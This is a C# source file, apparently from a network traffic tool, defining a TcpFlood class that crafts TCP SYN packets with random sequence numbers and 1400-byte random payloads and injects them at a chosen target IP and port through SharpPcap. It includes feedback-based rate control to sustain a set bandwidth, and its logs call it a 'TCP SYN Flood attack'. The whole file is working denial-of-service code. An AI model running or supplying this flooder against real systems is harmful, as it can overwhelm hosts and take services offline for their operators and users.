using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[1400] // Include payload for higher throughput
                };
                random.NextBytes(tcpPacket.PayloadData);
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // Get actual packet size from the Ethernet frame (includes Ethernet header + IP + TCP + payload)
                int totalPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000; // Increased batch size

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    // Pre-generate packet pool and get actual packet size
                    int actualPacketSize = 0;
                    for (int i = 0; i < batchSize; i++)
                    {
                        random.NextBytes(bytes);
                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                        // Get actual packet size from first packet
                        if (i == 0)
                        {
                            actualPacketSize = ethernetPacket.Bytes.Length;
                            Logger.Info($"TCP packet size: {actualPacketSize} bytes, Target rate: {_params.BytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
                        }
                    }

                    // Use actual packet size for rate calculation (Ethernet frame includes all headers)
                    // Calculate packets per second needed to achieve target Mbps
                    double targetPacketsPerSecond = (double)_params.BytesPerSecond / actualPacketSize;
                    Logger.Info($"Target: {targetPacketsPerSecond:F2} packets/sec to achieve {_params.BytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
                    
                    // Stable rate control: measure actual rate and adjust smoothly to avoid oscillation
                    var currentBatch = 0;
                    int packetsSent = 0;
                    var rateMeasurementStartTime = DateTime.UtcNow;
                    double rateMultiplier = 1.8; // Start with higher multiplier for faster ramp-up
                    double targetMbps = _params.BytesPerSecond * 8.0 / 1_000_000;
                    // Measure more frequently for high rates to adjust faster
                    int measurementInterval = targetMbps > 64 ? 150 : (targetMbps > 32 ? 200 : 250);
                    double actualMbps = 0; // Track actual Mbps for delay logic
                    bool isBehindTarget = true; // Start by sending aggressively
                    double lastActualMbps = 0; // Track previous measurement for stability
                    int stableMeasurements = 0; // Count consecutive stable measurements

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Send packet immediately - no waiting when trying to achieve target rate
                            var packet = packetPool[currentBatch];
                            injectionDevice.SendPacket(packet);
                            OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);

                            packetsSent++;
                            currentBatch++;
                            
                            // Regenerate packet pool when needed (do this less frequently to reduce overhead)
                            if (currentBatch >= batchSize)
                            {
                                // Regenerate in smaller chunks to reduce blocking
                                int regenerateCount = Math.Min(100, batchSize - currentBatch);
                                for (int i = 0; i < regenerateCount; i++)
                                {
                                    random.NextBytes(bytes);
                                    tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                    tcpPacket.UpdateCalculatedValues();
                                    ipPacket.UpdateCalculatedValues();
                                    packetPool[(currentBatch + i) % batchSize] = ethernetPacket.Bytes;
                                }
                                if (currentBatch >= batchSize)
                                {
                                    currentBatch = 0;
                                }
                            }

                            // Measure actual rate and adjust multiplier frequently
                            if (packetsSent % measurementInterval == 0)
                            {
                                var elapsedSeconds = (DateTime.UtcNow - rateMeasurementStartTime).TotalSeconds;
                                
                                if (elapsedSeconds > 0.05) // Need at least 50ms of data
                                {
                                    // Calculate actual packets per second
                                    double actualPacketsPerSecond = measurementInterval / elapsedSeconds;
                                    actualMbps = (actualPacketsPerSecond * actualPacketSize * 8.0) / 1_000_000;
                                    
                                    // Calculate what multiplier we need to achieve target
                                    if (actualMbps > 0 && targetMbps > 0)
                                    {
                                        // If we're achieving X% of target, we need (target/actual) multiplier
                                        double newMultiplier = targetMbps / actualMbps;
                                        
                                        // Check for oscillation: if rate is jumping around, use more smoothing
                                        double rateChange = Math.Abs(actualMbps - lastActualMbps);
                                        bool isOscillating = rateChange > targetMbps * 0.1; // More than 10% change indicates oscillation
                                        
                                        if (isOscillating)
                                        {
                                            // Heavy smoothing when oscillating to stabilize
                                            rateMultiplier = (rateMultiplier * 0.85) + (newMultiplier * 0.15);
                                            stableMeasurements = 0;
                                        }
                                        else if (isBehindTarget)
                                        {
                                            // When behind target, allow much faster adjustment to ramp up quickly
                                            // For high rates, use more aggressive 40/60 split; for low rates, use 50/50
                                            double smoothingFactor = targetMbps > 32 ? 0.4 : 0.5; // More aggressive for high rates
                                            rateMultiplier = (rateMultiplier * smoothingFactor) + (newMultiplier * (1.0 - smoothingFactor));
                                            stableMeasurements++;
                                        }
                                        else
                                        {
                                            // When at or above target, use moderate smoothing for stability
                                            rateMultiplier = (rateMultiplier * 0.75) + (newMultiplier * 0.25);
                                            stableMeasurements++;
                                        }
                                        
                                        // Clamp multiplier to reasonable range based on target rate
                                        // Increased max based on target rate: 8.0x for very high rates (>100), 6.0x for high (>64), 5.0x for medium (>32), 3.0x for low (>10), 1.5x for very low
                                        double maxMultiplierClamp = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5)));
                                        rateMultiplier = Math.Max(0.8, Math.Min(maxMultiplierClamp, rateMultiplier));
                                        
                                        // Check if we're behind target - use wider tolerance to reduce oscillation
                                        // Only consider "behind" if significantly below target to avoid rapid switching
                                        isBehindTarget = actualMbps < targetMbps * 0.95; // 5% tolerance for stability
                                        
                                        // If we've been stable for a while and close to target, reduce multiplier slightly
                                        if (stableMeasurements > 3 && Math.Abs(actualMbps - targetMbps) < targetMbps * 0.03)
                                        {
                                            // We're stable and close - reduce multiplier slightly to prevent overshoot
                                            rateMultiplier *= 0.98;
                                        }
                                        
                                        lastActualMbps = actualMbps;
                                        Logger.Info($"Rate feedback: actual={actualMbps:F2} Mbps, target={targetMbps:F2} Mbps, multiplier={rateMultiplier:F3}, behind={isBehindTarget}, oscillating={isOscillating}");
                                    }
                                    
                                    // Reset measurement
                                    rateMeasurementStartTime = DateTime.UtcNow;
                                }
                            }

                            // Always apply delay based on target rate, but adjust multiplier based on feedback
                            // This ensures we respect low Mbps settings (like 1 Mbps) from the start
                            // But also allows reaching high Mbps (like 100 Mbps) by using aggressive multipliers
                            double adjustedPacketsPerSecond = targetPacketsPerSecond;
                            
                            // If we have measurements and are significantly ahead, use target rate directly
                            // Otherwise, apply multiplier to compensate for overhead
                            if (actualMbps > 0 && actualMbps > targetMbps * 1.05 && stableMeasurements >= 2)
                            {
                                // We're ahead and stable - use target rate directly to maintain exact target
                                adjustedPacketsPerSecond = targetPacketsPerSecond;
                            }
                            else if (packetsSent >= measurementInterval && rateMultiplier > 0)
                            {
                                // Apply multiplier to compensate for overhead
                                // For very high rates, allow up to 8.0x multiplier; for high rates 6.0x; for low rates, cap lower to respect target
                                double maxMultiplier = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5))); // More aggressive for high rates
                                adjustedPacketsPerSecond = targetPacketsPerSecond * Math.Min(rateMultiplier, maxMultiplier);
                            }
                            else
                            {
                                // Initial phase - use multiplier based on target rate
                                // Low rates: use 1.0x (no overshoot), Medium: 1.8x, High rates: 3.5x, Very high: 4.0x for faster ramp-up
                                double initialMultiplier = targetMbps > 100 ? 4.0 : (targetMbps > 64 ? 3.5 : (targetMbps > 32 ? 2.5 : (targetMbps > 10 ? 1.8 : 1.0)));
                                adjustedPacketsPerSecond = targetPacketsPerSecond * initialMultiplier;
                            }
                            
                            // Always apply delay based on adjusted rate to respect target Mbps
                            double microsecondsPerPacket = 1_000_000.0 / adjustedPacketsPerSecond;
                            long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);
                            
                            if (ticksPerPacket > 0)
                            {
                                long currentTicks = stopwatch.ElapsedTicks;
                                long nextPacketTime = currentTicks + ticksPerPacket;
                                
                                // Wait until it's time to send the next packet
                                if (nextPacketTime > currentTicks)
                                {
                                    while (stopwatch.ElapsedTicks < nextPacketTime)
                                    {
                                        Thread.SpinWait(1);
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}